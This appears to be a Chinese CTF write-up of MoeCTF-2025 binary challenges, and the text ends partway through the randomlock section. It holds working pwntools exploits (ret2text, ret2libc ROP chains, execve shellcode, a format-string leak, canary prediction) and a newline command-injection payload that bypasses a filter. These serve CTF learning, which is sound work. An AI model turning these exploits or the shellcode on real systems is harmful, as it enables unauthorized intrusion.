# [个人] MoeCTF-2025的WriteUp (复现)

## 欢迎来到练习场！

练习场中的题目没有时间限制，可以无限次重试，请放心练习！

部分比赛在结束后也会一并迁移归档到练习场供大家练习所用。你在这里的提交不会获得任何分数，成果记录仅供你自己参考。在归档比赛中参与的任何题目练习都不会影响已归档比赛的成绩。比赛归档后，队伍将仅被保留在比赛排行榜中，只有你使用自己账号在比赛时解出的题目会在练习场标记为 `已解决`，队友解出的题目在练习场中仍保留为 `未解决` 状态。

另外请注意，比赛中需要花费分数购买的提示信息在练习场中已经自动解锁，无须花费分数购买；同样的，你的提交也不会获得任何分数。题解已经开放，当你实在无法解题时可以试着看一看题解，但是请不要直接抄题！平台不对练习场解题进行任何形式的奖励，因此在这里抄题是没有意义的，请对自己负责！

题目的内置问题反馈（也就是 `🔨 锤子` ）无法在练习场内使用，请使用平台所有者提供的其他反馈途径提交题目问题。

## 祝你好运！

希望本练习场能够为你带来技术进步！ :)



# Week

## 二进制漏洞审计

### **ez_u64**

#### 解题过程

下载解压直接扔进IDA，查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init();
  vuln();
  return 0;
}

int init()
{
  int fd; // [rsp+Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setbuf(stderr, 0LL);
  fd = open("/dev/urandom", 0, 0LL);
  if ( fd < 0 )
  {
    puts("urandom");
    exit(1);
  }
  read(fd, &num, 8uLL);
  return close(fd);
}

unsigned __int64 vuln()
{
  __int64 v1; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Ya hello! Let's play a game.");
  printf("Guess which number I'm thinking of.");
  printf("Here is the hint.");
  write(1, &num, 8uLL);
  printf("\n>");
  __isoc99_scanf("%zu", &v1);
  if ( v1 != num )
  {
    puts("Wrong answer!");
    puts("Try pwntools u64?");
    exit(1);
  }
  puts("Win!");
  system("/bin/sh");
  return v2 - __readfsqword(0x28u);
}
```

**分析：**

- `fd = open("/dev/urandom", 0, 0LL);`从`/dev/urandom`获取到随机数

- `read(fd, &num, 8uLL);`将随机八位赋值给num

- `write(1, &num, 8uLL);`泄露出`num`的二进制内容

- 我们只需要对`num`进行一次`u64`操作就能还原`num`的值

- 这里附带write(index, x, x)中index的说明

  | 文件描述符 | 名称   | 作用         | 常见对应场景       |
  | ---------- | ------ | ------------ | ------------------ |
  | 0          | stdin  | 标准输入     | 键盘输入、脚本传入 |
  | 1          | stdout | 标准输出     | 终端打印、正常输出 |
  | 2          | stderr | 标准错误输出 | 错误提示、异常信息 |

**构造并发送payload.py**

```python
from pwn import *

r = remote("127.0.0.1", 1449)

r.recvuntil(b">")
r.sendline(b'-1')

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 2149
[x] Opening connection to 127.0.0.1 on port 2149: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2149: Done
[*] Switching to interactive mode
>Win!
ls
bin
dev
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{uS3fuI-Th1nG5_In_PWntOo1584728412}
```

**得到：moectf{uS3fuI-Th1nG5_In_PWntOo1584728412}**



### **find it**

#### 解题过程

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char file[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = dup(1);
  write(v3, "I've hidden the fd of stdout. Can you find it?\n", 0x2FuLL);
  close(1);
  __isoc99_scanf("%d", &fd1);
  write(fd1, "You are right.What would you like to see?\n", 0x2AuLL);
  __isoc99_scanf("%s%*c", file);
  open(file, 0);
  write(fd1, "What is its fd?\n", 0x10uLL);
  __isoc99_scanf("%d", &fd2);
  read(fd2, &buf, 0x50uLL);
  write(fd1, &buf, 0x50uLL);
  return 0;
}
```

**分析：**

- 这里有三个输入`__isoc99_scanf("%d", &fd1);`和`__isoc99_scanf("%s%*c", file);`和`__isoc99_scanf("%d", &fd2);`
- 理论上是`3`然后`/flag`然后`1`
- 但是我们只需要`/flag`然后`1`就够了

**构造并发送payload**

```cmd
C:\Users\probie>nc 127.0.0.1 4731
I've hidden the fd of stdout. Can you find it?
flag
You are right.What would you like to see?
What is its fd?
1
moectf{fiND_th3_hlddEn_fD2e453f43445}
```

**得到：moectf{fiND_th3_hlddEn_fD2e453f43445}**



### **EZtext**

#### 解题过程

下载解压扔进IDA代码审计，看到源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+Ch] [rbp-4h] BYREF

  init(argc, argv, envp);
  puts("Stack overflow is a powerful art!");
  puts("In this MoeCTF,I will show you the charm of PWN!");
  puts("You need to understand the structure of the stack first.");
  puts("Then how many bytes do you need to overflow the stack?");
  __isoc99_scanf("%d", &v4);
  overflow(v4);
  return 0;
}

int __fastcall overflow(int a1)
{
  _BYTE buf[8]; // [rsp+18h] [rbp-8h] BYREF

  if ( a1 <= 7 )
    return puts("Come on, you can't even fill up this array?");
  read(0, buf, a1);
  return puts("OK,I receive your byte.and then?");
}
```

**分析：**

由`  read(0, buf, a1);`我们可知这道题目存在栈溢出漏洞可以利用

首先它有两个输入`__isoc99_scanf("%d", &v4);`和`read(0, buf, a1);`

`read`函数是一个读取输入的函数，`0`代表标准模式，`buf`是缓冲区，这里的`a1`是我们的第一个输入`v4`是读取长度

我们可以通过覆盖缓冲区来覆盖返回地址，跳转到`bin/sh`

我们找一下就找到了后门函数

```
.text:00000000004011B6                 public treasure
.text:00000000004011B6 treasure        proc near
.text:00000000004011B6 ; __unwind {
.text:00000000004011B6                 endbr64
.text:00000000004011BA                 push    rbp
.text:00000000004011BB                 mov     rbp, rsp
.text:00000000004011BE                 lea     rax, s          ; "Congratulations! You got the secret!"
.text:00000000004011C5                 mov     rdi, rax        ; s
.text:00000000004011C8                 call    _puts
.text:00000000004011CD                 lea     rax, command    ; "/bin/sh"
.text:00000000004011D4                 mov     rdi, rax        ; command
.text:00000000004011D7                 call    _system
.text:00000000004011DC                 nop
.text:00000000004011DD                 pop     rbp
.text:00000000004011DE                 retn
.text:00000000004011DE ; } // starts at 4011B6
.text:00000000004011DE treasure        endp
```

**注意到：**

.text:00000000004011CD                 lea     rax, command    ; "/bin/sh"

`0x4011CD`是我们要跳转的返回地址

我们直接来构造并发送payload.py

```python
from pwn import *

r = remote("127.0.0.1", 2512)

r.sendline(b'32')
r.sendline(b'a'*(8+8)+p64(0x4011CD)+p64(0x00))

r.interactive()
```

**解读：**

我们发送的内容是通过byte解析的所以要用`b''`来封装

`r.sendline(b'32')`确定我们的读取长度，即`a1`是32个字符

`r.sendline(b'a'*(8+8)+p64(0x4011CD)+p64(0x00))`中

第一个`8`是垃圾字符来充满我们的缓冲区

第二个`8`是充满我们的`rbp基址寄存器`一般都是8个字节`[rbp-8h]`

然后`p64(0x4011CD)`是我们要跳转的后门函数地址

然后`p64(0x00)`是为了栈对齐

总共是8+8+8+8=4*8=32个字节，所以我们读取的长度要>=32

发送payload.py得到：

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to 127.0.0.1 on port 2512
[x] Opening connection to 127.0.0.1 on port 2512: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2512: Done
[*] Switching to interactive mode
Stack overflow is a powerful art!
In this MoeCTF,I will show you the charm of PWN!
You need to understand the structure of the stack first.
Then how many bytes do you need to overflow the stack?
OK,I receive your byte.and then?
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{rEtZteXt_ls_THE-START-0f-rOp66b3f27}
```

得到：moectf{rEtZteXt_ls_THE-START-0f-rOp66b3f27}



### ezshellcode

#### 解题过程

下载解压直接扔进IDA进行代码审计，看到源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-20h] BYREF
  int prot; // [rsp+4h] [rbp-1Ch]
  int v6; // [rsp+8h] [rbp-18h]
  int v7; // [rsp+Ch] [rbp-14h]
  void *s; // [rsp+10h] [rbp-10h]
  unsigned __int64 v9; // [rsp+18h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  init(argc, argv, envp);
  s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
  if ( s == (void *)-1LL )
  {
    perror("mmap");
    return 1;
  }
  memset(s, 0, 0x1000uLL);
  v6 = 0;
  prot = 0;
  puts("In a ret2text exploit, we can use code in the .text segment.");
  puts("But now, there is no 'system' function available there.");
  puts("How can you get the flag now? Perhaps you should use shellcode.");
  puts("But what is shellcode? What can you do with it? And how can you use it?");
  puts("I will give you some choices. Choose wisely!");
  __isoc99_scanf("%d", &v4);
  do
    v7 = getchar();
  while ( v7 != 10 && v7 != -1 );
  if ( v4 == 4 )
  {
    if ( v6 == 1 )
      puts("You can only make one change!");
    prot = 7;
    v6 = 1;
  }
  else
  {
    if ( v4 > 4 )
      goto LABEL_24;
    switch ( v4 )
    {
      case 3:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 4;
        v6 = 1;
        break;
      case 1:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 1;
        v6 = 1;
        break;
      case 2:
        if ( v6 == 1 )
          puts("You can only make one change!");
        prot = 3;
        v6 = 1;
        break;
      default:
LABEL_24:
        puts("Invalid choice. The space remains in its chaotic state.");
        exit(1);
    }
  }
  if ( mprotect(s, 0x1000uLL, prot) == -1 )
  {
    perror("mprotect");
    exit(1);
  }
  puts("\nYou have now changed the permissions of the shellcode area.");
  puts("If you can't input your shellcode, think about the permissions you just set.");
  read(0, s, 0x1000uLL);
  ((void (*)(void))s)();
  return 0;
}
```

**分析：**

程序有两个输入` __isoc99_scanf("%d", &v4);`和`read(0, s, 0x1000uLL);`

注意到它存在shellcode注入漏洞`s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);`

并且我们可以通过v4来操作mmap的权限`mprotect(s, 0x1000uLL, prot) == -1`

```
prot = 1 # 仅可执行，无读写权限
prot = 3 # 可读可写，不可执行
prot = 4 # 仅可读，无写 / 执行权限
prot = 7 # 可读可写可执行
```

我们需要`prot=4`即`v4=4`

```c
if ( v4 == 4 )
  {
    if ( v6 == 1 )
      puts("You can only make one change!");
    prot = 7;
    v6 = 1;
  }
  else
```

然后我们构造payload

```
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
```

**解读：**

```
\x31\xc0（清零 rax）\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff（mov rbx, ...）\x48\xf7\xdb（neg rbx）\x53（push rbx）\x54（push rsp，调整栈）\x5f（pop rdi，rdi 指向 /bin/sh）\x99（cdq，edx=0，即 rdx=0）\x52（push rdx，参数列表为 NULL）\x57（push rdi）\x54（push rsp）\x5e（pop rsi，rsi=NULL）\xb0\x3b（mov al, 0x3b，rax=0x3b）\x0f\x05（syscall）
```

开启容器得到：wss://ctf.xidian.edu.cn/api/traffic/aGTmlbgjD71VQGwRnNggM?port=9999

我们使用WebSocket连接得到：127.0.0.1:3925

使用netcat连接：

```cmd
nc 127.0.0.1 3925
```

得到：

```cmd
C:\Users\probie>nc 127.0.0.1 3925
In a ret2text exploit, we can use code in the .text segment.
But now, there is no 'system' function available there.
How can you get the flag now? Perhaps you should use shellcode.
But what is shellcode? What can you do with it? And how can you use it?
I will give you some choices. Choose wisely!
4

You have now changed the permissions of the shellcode area.
If you can't input your shellcode, think about the permissions you just set.
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

C:\Users\probie
```

这里没有被执行是因为我们的payload是被当作字符串string来执行的，我们需要用byte

构造payload.py

```python
from pwn import *

p = remote('127.0.0.1', 3925)
p.sendline(b'4')

shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
p.send(shellcode)

p.interactive()
```

执行payload.py得到：

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to 127.0.0.1 on port 3925
[x] Opening connection to 127.0.0.1 on port 3925: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 3925: Done
[*] Switching to interactive mode
In a ret2text exploit, we can use code in the .text segment.
But now, there is no 'system' function available there.
How can you get the flag now? Perhaps you should use shellcode.
But what is shellcode? What can you do with it? And how can you use it?
I will give you some choices. Choose wisely!

You have now changed the permissions of the shellcode area.
If you can't input your shellcode, think about the permissions you just set.
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{P0weRFuI_5He1lCoD3-c@N_dO-@nyTHInGecd15}
```

得到：moectf{P0weRFuI_5He1lCoD3-c@N_dO-@nyTHInGecd15}



### **认识libc**

#### 解题过程

下载解压得到`pwn`和`libc.so.6`扔进IDA查看`pwn`的源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  puts("The Oracle speaks...");
  puts("There is no system function in the .text segment.");
  printf("A gift of forbidden knowledge, the location of 'printf': %p\n", &printf);
  vuln();
  return 0;
}
=====================================================================================================
ssize_t vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("\nNow, show me what you can do with this knowledge:");
  printf("> ");
  return read(0, buf, 0x100uLL);
}
```

**分析：**

- 重点看到它的这个`_BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF`
- 和`return read(0, buf, 0x100uLL);`这两条代码存在明显的栈溢出漏洞可以利用
- 但是它并没有给出`system("bin/sh")`类似的函数调用，要利用`ROP`链自己调用

**信息收集：**

- `pwn`架构

  ```shell
  probie@Probie:/mnt/d/Downloads/prelibc$ file pwn
  pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=522dfca8b9031a1a9c45c41092e4f42b6dbfe93d, for GNU/Linux 3.2.0, not stripped
  ```

  **解读：**linux操作系统64位小端序

- `pop rdi`把栈顶数据即`bin/sh`放入`rdi`

  ```shell
  ┌──(kali㉿kali)-[~/Desktop/ctf/prelibc]
  └─$ source '/home/kali/Desktop/ctf/venv/bin/activate'
                                                                            
  ┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/prelibc]
  └─$ ropper -f libc.so.6 --search "pop rdi; ret"
  [INFO] Load gadgets from cache
  [LOAD] loading... 100%
  [LOAD] removing double gadgets... 100%
  [INFO] Searching for gadgets: pop rdi; ret
  
  [INFO] File: libc.so.6
  0x000000000002a3e5: pop rdi; ret; 
  0x00000000000eb96d: pop rdi; retf; dec dword ptr [rax - 0x77]; ret 0x8949;
  ```

  **解读：**`pop rdi`的地址我们区`0x2a3e5`

- `ret`弹栈+跳转到`system`

  ```shell
  ┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/prelibc]
  └─$ ropper -f libc.so.6 --search "ret"         
  [INFO] Load gadgets from cache
  [LOAD] loading... 100%
  [LOAD] removing double gadgets... 100%
  [INFO] Searching for gadgets: ret
  
  [INFO] File: libc.so.6
  0x000000000002db7d: ret 0;
  ```

  **解读：**`ret`的地址我们区`0x2db7d`

- bin/sh

  ```shell
  ┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/prelibc]
  └─$ strings -a -t x libc.so.6 | grep bin/sh          
   1d8678 /bin/sh
  ```

  **解读：**获取到`bin/sh`的地址`0x1d8678`

构造并发送payload.py

```python
from pwn import *

r = remote("127.0.0.1", 6985)
libc = ELF("libc.so.6")

# 收集到的偏移地址
address_pop_rdi = 0x2a3e5
address_bin_sh = 0x1d8678
address_ret = 0x2db7d

r.recvuntil(b"A gift of forbidden knowledge, the location of 'printf': ")
address_printf = int(r.recvline().strip(),16)

# 计算libc的基地址
address_libc_base = address_printf - libc.sym["printf"]

# 计算真实地址
address_system = address_libc_base + libc.sym["system"]
address_pop_rdi = address_libc_base + address_pop_rdi
address_bin_sh = address_libc_base + address_bin_sh
address_ret = address_libc_base + address_ret

r.recvuntil(b">")
payload = b'a'*(64+8)+p64(address_pop_rdi)+p64(address_bin_sh)+p64(address_ret)+p64(address_system)

r.sendline(payload)
r.interactive()
```

**解读：**

- payload的`64+8`中`64`是缓冲区大小，`8`是`rdp`上一基地址寄存器的大小
- 按照`64架构`栈的`先进后出`原理，我们先传入参数`bin/sh`然后再跳转执行`system`

得到响应

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to 127.0.0.1 on port 6985
[x] Opening connection to 127.0.0.1 on port 6985: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 6985: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test03\\libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
 ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{Y0u-JU5T-H@v3-IIBC_N0Waa56e6e22}
```

得到：moectf{Y0u-JU5T-H@v3-IIBC_N0Waa56e6e22}



### **boom**

#### 解题过程

下载解压扔进IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[124]; // [rsp+0h] [rbp-90h] BYREF
  int v5; // [rsp+7Ch] [rbp-14h]
  int v6; // [rsp+8Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome to Secret Message Book!");
  puts("Do you want to brute-force this system? (y/n)");
  fgets(&brute_choice, 8, stdin);
  v6 = 0;
  if ( brute_choice == 121 || brute_choice == 89 )
  {
    v6 = 1;
    canary = (int)random() % 114514;
    v5 = canary;
    puts("waiting...");
    sleep(1u);
    puts("boom!");
    puts("Brute-force mode enabled! Security on.");
  }
  else
  {
    puts("Normal mode. No overflow allowed.");
  }
  printf("Enter your message: ");
  if ( v6 )
    gets(s);
  else
    fgets(s, 128, stdin);
  if ( v6 && v5 != canary )
  {
    puts("Security check failed!");
    exit(1);
  }
  puts("Message received.");
  return 0;
}
=====================================================================================================
void init()
{
  unsigned int v0; // eax

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  v0 = time(0LL);
  srandom(v0);
}
```

**解读：**

- 它有两次输入`fgets(&brute_choice, 8, stdin);`和`gets(s);`或`fgets(s, 128, stdin);`
- 简单分析一下只有`gets(s);`能触发栈溢出漏洞所以第一次输入`y`
- 然后发现它有随机数金丝笼`canary`保护，而且每次运行程序都会更新`srandom(v0);`
- 所以我们需要获取和它相同的时间来推导出`canary`
- 这里用`from ctypes import *`的`libc = CDLL("libc.so.6")`来调用c库的`libc.srand(int(time.time()))`然后用`canary = libc.rand() % 114514`来获得canary

由此，我们直接构造并在linux操作系统(这里用kali)发送payload.py

```python
from pwn import *
from ctypes import *

r = remote("127.0.0.1", 45827)

r.recvuntil(b"Do you want to brute-force this system? (y/n)")
r.sendline(b'y')

libc = CDLL("libc.so.6")
libc.srand(int(time.time()))
canary = libc.rand() % 114514

r.recvuntil(b"Enter your message: ")
payload = b'a'*124+p32(canary)+b'a'*(4+12+8)+p64(0x40101a)+p64(0x401276)
r.sendline(payload)

r.interactive()
```

**分析：**

- `124`是为了填满`s`的缓冲区
- 这里的`canary`是`int`占`4字节`所以用p32
- `(4+12+8)`中`4`是填充`v6`的缓冲区、`12`是填充栈空白、`8`是填充`rdp`
- `0x40101a`是用`ida`逆向找到的纯净`return`地址
- `0x401276`是后门函数入口地址

获取到shell后得到响应

```shell
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ source '/home/kali/Desktop/ctf/venv/bin/activate'
                                                                                             
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ python3 payload.py
[+] Opening connection to 127.0.0.1 on port 40683: Done
[*] Switching to interactive mode
Message received.
$ ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
moectf{l45T-TIME_tiM3-is-SPE3DiNG_UP1de1a6f}
```

得到：moectf{l45T-TIME_tiM3-is-SPE3DiNG_UP1de1a6f}



### **boom_revenge**

#### 解题过程

参考**`boom`**



### fmt

#### 解题过程

下载解压看到源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-88h]
  char s1[16]; // [rsp+10h] [rbp-80h] BYREF
  char s2[16]; // [rsp+20h] [rbp-70h] BYREF
  char s[88]; // [rsp+30h] [rbp-60h] BYREF
  unsigned __int64 v8; // [rsp+88h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v4 = (char *)malloc(0x20uLL);
  generate(s2, 5LL);
  generate(v4, 5LL);
  puts("Hey there, little one, what's your name?");
  fgets(s, 80, stdin);
  printf("Nice to meet you,");
  printf(s);
  puts("I buried two treasures on the stack.Can you find them?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, s2, 5uLL) )
    lose();
  puts("Yeah,another one?");
  fgets(s1, 8, stdin);
  if ( strncmp(s1, v4, 5uLL) )
    lose();
  win();
  return 0;
}
=====================================================================================================
unsigned __int64 __fastcall generate(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [rsp+18h] [rbp-48h]
  char v4[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(v4, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
  for ( i = 0LL; i < a2; ++i )
    *(_BYTE *)(a1 + i) = v4[(int)arc4random_uniform(52LL)];
  *(_BYTE *)(a1 + a2) = 0;
  return v5 - __readfsqword(0x28u);
}
```

**解读：**

- `generate`函数的作用是获取随机字符，所以这里的`s2`和`v4`都是长度为`5`的随机`字符串`
- 程序有三次输入`fgets(s, 80, stdin);`、`fgets(s1, 8, stdin);`、`fgets(s1, 8, stdin);`它们的作用分别是获取并输出我的名字，与s2作比较，与v4做比较
- 注意到这里`printf(s);`程序直接拿用户的输入来格式化输出，这里存在`格式化输出漏洞`可利用获得`s2`和`v4`的值
- 一般来说`栈stack`的内存值是从`7`开始的，1-6存放的是寄存器的值所以`v4是7`，测试一下发现`s2是10`
- 因为v4是直接用`*v4`的所以可用`%s`格式化输出，s2则需要用`%p`后用`p64`或`p32`还原值
- 需要注意的是用`p64`或`p32`还原值后还需要用`[:-3]`来剔除尾部的`\x00`，这里类比`[::-1]`是反转、`[:-1]`是剔除出最后一个字符

**构造并发送payload.py**

```python
from pwn import *

r = remote("127.0.0.1", 4542)

r.recvuntil(b"Hey there, little one, what's your name?")
payload = b"%10$p|%7$s"
r.sendline(payload)

r.recvuntil(b"Nice to meet you,")
res = r.recv(12+1+5)
s2_addr = int(res[:res.find(b'|')].decode(), 16)
s2 = p64(s2_addr)[:-3]
v4 = res[res.find(b'|')+1:res.__len__()]

r.recvuntil(b"I buried two treasures on the stack.Can you find them?")
r.sendline(s2)

r.recvuntil(b"Yeah,another one?")
r.sendline(v4)

r.interactive()
```

**成功拿到shell后执行命令**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test03\Main.py 
[x] Opening connection to 127.0.0.1 on port 4542
[x] Opening connection to 127.0.0.1 on port 4542: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4542: Done
[*] Switching to interactive mode

You got it!
ls
bin
flag
lib
lib32
lib64
libexec
pwn
cat flag
moectf{th3_beGInN1nG-OF_foRM@T2710f4e1b}
```

**得到：**moectf{th3_beGInN1nG-OF_foRM@T2710f4e1b}



### inject

#### 解题过程

下载解压题目

**扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-2Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-28h]

  v5 = __readfsqword(0x28u);
  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  puts("Welcome to server maintainance system.");
  while ( 1 )
  {
    _printf_chk(
      1LL,
      "1. List processes\n2. Check disk usage\n3. Check network activity\n4. Test connectivity\n5. Exit\nYour choice: ");
    if ( (int)_isoc99_scanf("%u", &v4) < 0 )
      break;
    getc(stdin);
    switch ( v4 )
    {
      case 1:
        execute("ps aux");
        break;
      case 2:
        execute("df -h");
        break;
      case 3:
        execute("netstat -ant");
        break;
      case 4:
        ping_host();
        break;
      case 5:
        exit(0);
      default:
        puts("Invalid choice!");
        break;
    }
  }
  exit(1);
}

int __fastcall execute(char *command)
{
  _printf_chk(1LL, "Executing command: %s\n", command);
  if ( system(command) )
    return puts("Something went wrong.\n");
  else
    return puts("Done.");
}

unsigned __int64 ping_host()
{
  size_t v0; // rax
  unsigned __int64 result; // rax
  char v2; // [rsp+1h] [rbp-51h]
  _QWORD buf[2]; // [rsp+2h] [rbp-50h] BYREF
  char command[40]; // [rsp+12h] [rbp-40h] BYREF
  unsigned __int64 v5; // [rsp+3Ah] [rbp-18h]

  v5 = __readfsqword(0x28u);
  buf[0] = 0LL;
  buf[1] = 0LL;
  _printf_chk(1LL, "Enter host to ping: ");
  if ( read(0, buf, 0xFuLL) <= 0 )
    exit(1);
  v0 = strlen((const char *)buf);
  if ( *(&v2 + v0) == 10 )
    *(&v2 + v0) = 0;
  if ( (unsigned int)check(buf) )
  {
    _snprintf_chk(command, 32LL, 1LL, 32LL, "ping %s -c 4", (const char *)buf);
    execute(command);
  }
  else
  {
    puts("Invalid hostname or IP!");
  }
  result = v5 - __readfsqword(0x28u);
  if ( result )
    _stack_chk_fail();
  return result;
}

_BOOL8 __fastcall check(const char *a1)
{
  return strpbrk(a1, ";&|><$(){}[]'\"`\\!~*") == 0LL;
}
```

**分析：**

- 我们的主要注入点在于`ping_host();`这是一个命令行执行任意命令漏洞

- `_snprintf_chk(command, 32LL, 1LL, 32LL, "ping %s -c 4", (const char *)buf);`看到这里它会执行我们构造的`buf`我们可以先给`ping`填充一个参数`a`然后用换行符`\n`拼接我们的恶意指令`cat flag`然后用`#`注释掉后面的参数

- 虽然这里有个过滤操作

  ```c
  return strpbrk(a1, ";&|><$(){}[]'\"`\\!~*") == 0LL;
  ```

  但是如果我们利用pwntools来发送我们encode("utf-8")后的数据就可以很好的绕过这个过滤

**构造并发送payload.py**

```python
from pwn import *

r = remote("127.0.0.1", 12127)

r.recvuntil(b"Your choice:")
r.sendline(b'4')

r.recvuntil(b"Enter host to ping:")
payload = "a\ncat flag #"
r.sendline(payload.encode())

r.interactive()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 12127
[x] Opening connection to 127.0.0.1 on port 12127: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 12127: Done
[*] Switching to interactive mode
 Executing command: ping a
cat flag # -c 4
sh: 1: ping: not found
moectf{tHIs_lS_Not-llkE_a-Pwn-cHaL1eng315e924}
Done.
1. List processes
2. Check disk usage
3. Check network activity
4. Test connectivity
5. Exit
Your choice: 
```

**得到：moectf{tHIs_lS_Not-llkE_a-Pwn-cHaL1eng315e924}**



### **randomlock**

#### 解题过程

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  int i; // [rsp+10h] [rbp-10h]
  int v6; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v7; // [rsp+18h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  initseed();
  srand(seed);
  puts("My lock looks strange—can you help me?");
  for ( i = 1; i <= 10; ++i )
  {
    printf("password %d\n>", i);
    v6 = rand() % 10000;
    __isoc99_scanf("%d", &v4);
    if ( v6 != v4 )
      lose();
  }
  win();
  return 0;
}

__int64 initseed()
{
  __int64 result; // rax
  int i; // [rsp+8h] [rbp-8h]
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0, 0LL);
  if ( fd < 0 )
  {
    puts("urandom");
    exit(1);
  }
  read(fd, &seed, 3uLL);
  close(fd);
  seed = seed % 0x64 + 1;
  for ( i = 1; i <= 120; ++i )
    change();
  while ( 1 )
  {
    result = seed & 1;
    if ( (seed & 1) != 0 )
      break;
    change();
  }
  return result;
}

__int64 change()
{
  __int64 result; // rax

  if ( (seed & 1) != 0 )
  {
    result = 3 * seed + 1;
    seed = 3 * seed + 1;
  }
  else
  {
    result = seed >> 1;
    seed >>= 1;
  }
  return result;
}
```

**分析：**

- 获取到种子`seed`是这道题的重点
- 获取到种子`seed`后我们就能获取到伪随机数容器`srand(seed)`
- 进而获取到一系列`v6 = rand() % 10000`

我们这里在`if ( v6 != v4 )`打上断点后发现seed0经过一些列变换后得到的seedFin总是一个确数`1`

我们可以用调试获取到10个确数`v6`

但是作为懒人，我们可以用`python`来模拟`c`的`srand`来获取伪随机数列

**前置知识示例**

```python
import sys
from ctypes import *

if sys.platform == 'win32':
    print(cdll.msvcrt.srand(1))
    print(cdll.msvcrt.rand())

if sys.platform == 'linux':
